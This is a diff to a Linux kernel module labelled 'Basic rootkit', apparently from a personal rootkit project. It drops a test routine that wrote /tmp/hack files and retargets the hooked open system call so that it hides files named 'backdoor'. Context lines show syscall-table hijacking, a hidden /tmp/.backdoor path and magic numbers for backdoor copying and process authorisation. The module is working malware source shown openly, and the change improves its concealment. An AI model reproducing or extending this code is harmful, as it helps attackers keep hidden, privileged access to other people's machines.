@@ -27,11 +27,8 @@ MODULE_AUTHOR("Antoine Rouquette");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Basic rootkit");
 
-#define FILE_PATH           "/tmp/hack"
-#define FILE_PATH_SIZE      9
-#define FILE_BASENAME       "hack"
-#define FILE_BASENAME_SIZE  4
 #define BACKDOOR_PATH       "/tmp/.backdoor"
+#define BACKDOOR_BASENAME   "backdoor"
 #define MAGIC_COPY_BACKDOOR 1233
 #define MAGIC_AUTH_PID      1234
 #define MAGIC_BACKDOOR      1235
@@ -1123,35 +1120,6 @@ static int get_vip_index(const char * filename)
 }
 
 /**
- * \fn      static int create_hack_file(void)
- * \brief   Create small file with index written inside it
- * \return  0 if everything went well.
- * */
-static int create_hack_file(void)
-{
-#define MAX_NAME_SIZE   64
-    int     cnt                     = 0;
-    char    filename[MAX_NAME_SIZE] = {'\0'};
-    struct  file * filp             = NULL;
-
-    do
-    {
-        snprintf(filename, MAX_NAME_SIZE, "%s%d.txt", FILE_PATH, cnt);
-        filp = file_open(filename, O_RDWR | O_APPEND | O_CREAT, 0);
-        if(filp)
-        {
-            printk("[%s] File : %s created!\n", __this_module.name, filename);
-            file_write(filp, 0, filename, strlen(filename));
-            file_close(filp);
-            filp = NULL;
-        }
-        cnt++;
-    } while(cnt < 10);
-
-    return 0;
-}
-
-/**
  * \fn      static char * extract_line(const char * buf, char * line, size_t count)
  * \brief   Extract the 1st line found in a buffer
  * \param   buf  : buffer to be checked for a line
@@ -1308,7 +1276,7 @@ asmlinkage int fake_sys_open(const char *pathname, int flags)
     }
     else
     {
-        if(!strstr(pathname, FILE_BASENAME))
+        if(!strstr(pathname, BACKDOOR_BASENAME))
         {
             fd = original_sys_open(pathname, flags);
             if(is_vip >= 0)
@@ -1557,8 +1525,6 @@ static int __init lkm_init(void)
     }
     else
         printk("[%s] 1.sys_call_table found : 0x%p.\n", __this_module.name, sys_call);
-
-    create_hack_file();
 
     original_sys_open       = sys_call[__NR_open];
     original_sys_read       = sys_call[__NR_read];
